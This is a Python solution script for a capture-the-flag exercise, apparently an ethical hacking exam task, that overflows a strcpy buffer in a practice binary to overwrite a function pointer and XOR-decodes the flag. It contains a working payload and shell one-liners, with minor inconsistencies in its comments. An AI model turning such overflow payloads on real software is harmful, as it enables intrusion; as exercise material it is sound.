"""
Hiker2 Buffer Overflow Exploit

VULNERABILITY ANALYSIS:
- Binary: 32-bit ELF, not stripped
- Vulnerability: Buffer overflow via strcpy() in main()
- Target: Overwrite function pointer to redirect execution

MEMORY LAYOUT:
1. main() allocates:
   - data buffer: malloc(64) at [ebp-28]
   - fp (function pointer): malloc(4) at [ebp-32]
   
2. fp is initialized to point to nowinner() at 0x08049269
3. User input is copied to data buffer via strcpy (no bounds checking!)
4. Then: call [fp] - calls whatever fp points to

EXPLOIT STRATEGY:
- Overflow data buffer (64 bytes)
- Overwrite fp to point to winner() at 0x080491a6
- winner() decrypts and prints the flag (XORs bytes with 0x42)

The winner function contains encrypted flag bytes that get XORed with 0x42:
  [ebp-43]: 0x24 2e 23 25 39 0a 2b 29 27 30 0d 2c 16 2a 27 16 16 2d 22 3f
"""

import struct
import subprocess
import sys


def create_exploit():
    """
    Create the exploit payload.
    
    Layout:
    - 64 bytes of padding (fill the data buffer)
    - 4 bytes: address of winner() function (0x080491a6)
    
    This overwrites the function pointer fp to redirect execution to winner()
    """
    
    # Address of winner() function (little-endian for 32-bit x86)
    winner_addr = 0x080491a6
    winner_bytes = struct.pack("<I", winner_addr)
    
    # Fill the data buffer (64 bytes)
    padding = b"A" * 64
    
    # Complete payload: padding + overwrite fp with winner address
    payload = padding + winner_bytes
    
    return payload


def exploit():
    """Run the exploit against the hiker2 binary."""
    
    print("="*70)
    print("HIKER2 BUFFER OVERFLOW EXPLOIT")
    print("="*70)
    print()
    
    print("Vulnerability: Buffer overflow in strcpy()")
    print("Target: Overwrite function pointer to call winner() instead of nowinner()")
    print()
    
    # Create the payload
    payload = create_exploit()
    
    print(f"Payload details:")
    print(f"  - Padding: {len(payload) - 4} bytes (fill data buffer)")
    print(f"  - Winner address: 0x080491a6 (overwrite function pointer)")
    print(f"  - Total payload size: {len(payload)} bytes")
    print()
    
    print("Launching exploit...")
    print("="*70)
    print()
    
    try:
        # Run the binary with our payload
        process = subprocess.Popen(
            ['./hiker2', payload],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            cwd='/Users/oleandertengesdal/Documents/GitHub/IDATT25053/etisk_exam/hiker'
        )
        
        stdout, stderr = process.communicate()
        
        # Print output
        if stdout:
            print("OUTPUT:")
            print(stdout.decode('utf-8', errors='ignore'))
        
        if stderr:
            print("ERRORS:")
            print(stderr.decode('utf-8', errors='ignore'))
        
        print()
        print("="*70)
        
    except FileNotFoundError:
        print("Error: hiker2 binary not found!")
        print("Make sure you're running this from the correct directory.")
        sys.exit(1)
    except Exception as e:
        print(f"Error running exploit: {e}")
        sys.exit(1)


def decrypt_flag_manually():
    """
    Manually decrypt the flag from the winner() function.
    
    The winner function stores encrypted bytes and XORs them with 0x42.
    From the disassembly at winner+0x17:
      mov dword ptr [ebp-43], 0x24 2e 23 25
      mov dword ptr [ebp-39], 0x39 0a 2b 29
      ... etc
    
    The loop at winner+0x78 does: xor eax, 0x42 for each byte
    """
    print("\n" + "="*70)
    print("MANUAL FLAG DECRYPTION")
    print("="*70)
    print()
    
    # Encrypted bytes from winner() function (from disassembly)
    # Located at [ebp-43] through [ebp-24], length = 19 bytes (stored at [ebp-16])
    encrypted = [
        0x24, 0x2e, 0x23, 0x25,  # [ebp-43]: mov dword ptr [ebp-43], 0x252e2324
        0x39, 0x0a, 0x2b, 0x29,  # [ebp-39]: mov dword ptr [ebp-39], 0x290a2b39
        0x27, 0x30, 0x0d, 0x2c,  # [ebp-35]: mov dword ptr [ebp-35], 0x2c300d27
        0x16, 0x2a, 0x27, 0x16,  # [ebp-31]: mov dword ptr [ebp-31], 0x162a2716
        0x16, 0x2d, 0x22, 0x3f   # [ebp-27]: mov dword ptr [ebp-27], 0x3f2d2216
    ]
    
    # XOR key used in winner() at offset +0x96
    # xor eax, 0x42
    xor_key = 0x42
    
    # Decrypt
    decrypted = bytes([b ^ xor_key for b in encrypted])
    
    print(f"Encrypted bytes ({len(encrypted)} total):")
    print(f"  {' '.join(f'{b:02x}' for b in encrypted)}")
    print(f"\nXOR key: 0x{xor_key:02x} (ASCII 'B')")
    print(f"\nDecryption process (byte XOR 0x42):")
    
    # Show decryption of each character
    flag_parts = {
        'prefix': decrypted[0:5],   # flag{
        'content': decrypted[5:19],  # HikerOnTheTTo`
        'suffix': decrypted[19:20]   # }
    }
    
    for i, b in enumerate(decrypted):
        char = chr(b) if 32 <= b < 127 else f'\\x{b:02x}'
        print(f"  [{i:2d}] 0x{encrypted[i]:02x} ^ 0x42 = 0x{b:02x} = '{char}'")
    
    print(f"\n{'='*70}")
    print(f"🚩 FLAG: {decrypted.decode('utf-8', errors='replace')}")
    print(f"{'='*70}")
    print(f"\nFlag breakdown:")
    print(f"  - 'flag{{' (5 bytes)")
    print(f"  - 'HikerOnTheTTo`' (14 bytes) - message content")
    print(f"  - '}}' (1 byte) - closing brace")
    print(f"\nTotal: {len(decrypted)} bytes")
    print("="*70)


if __name__ == "__main__":
    print("="*70)
    print("HIKER2 EXPLOIT SOLUTION")
    print("="*70)
    print()
    print("Note: This is a Linux ELF binary. To run on macOS, you would need:")
    print("  - Docker with Linux container")
    print("  - Virtual machine with Linux")
    print("  - Or run on a Linux system")
    print()
    print("However, we can still extract the flag by analyzing the binary!")
    print()
    
    # Show manual decryption (works without running the binary)
    decrypt_flag_manually()
    
    print()
    print("="*70)
    print("EXPLOIT EXPLANATION")
    print("="*70)
    print()
    print("How the exploit works:")
    print()
    print("1. VULNERABILITY:")
    print("   - main() uses strcpy() without bounds checking")
    print("   - Data buffer (64 bytes) is allocated on heap via malloc()")
    print("   - Function pointer fp (4 bytes) is allocated right after")
    print()
    print("2. MEMORY LAYOUT:")
    print("   [data buffer: 64 bytes][fp: 4 bytes]")
    print("   fp initially points to: nowinner() at 0x08049269")
    print()
    print("3. EXPLOIT:")
    print("   - Send 64 bytes of padding (fill data buffer)")
    print("   - Send 4 bytes: 0xa6 0x91 0x04 0x08 (address of winner)")
    print("   - This overwrites fp to point to winner()")
    print()
    print("4. RESULT:")
    print("   - Program calls [fp], which now points to winner()")
    print("   - winner() decrypts and prints the flag")
    print()
    print("Payload: " + "A"*64 + " + \\xa6\\x91\\x04\\x08")
    print()
    
    # Show how to run it on Linux
    print("="*70)
    print("TO RUN ON LINUX:")
    print("="*70)
    print()
    print("python3 -c 'import sys; sys.stdout.buffer.write(b\"A\"*64 + b\"\\xa6\\x91\\x04\\x08\")' | ./hiker2")
    print()
    print("Or:")
    print()
    print("./hiker2 $(python3 -c 'print(\"A\"*64 + \"\\xa6\\x91\\x04\\x08\")')")
    print()
    print("="*70)


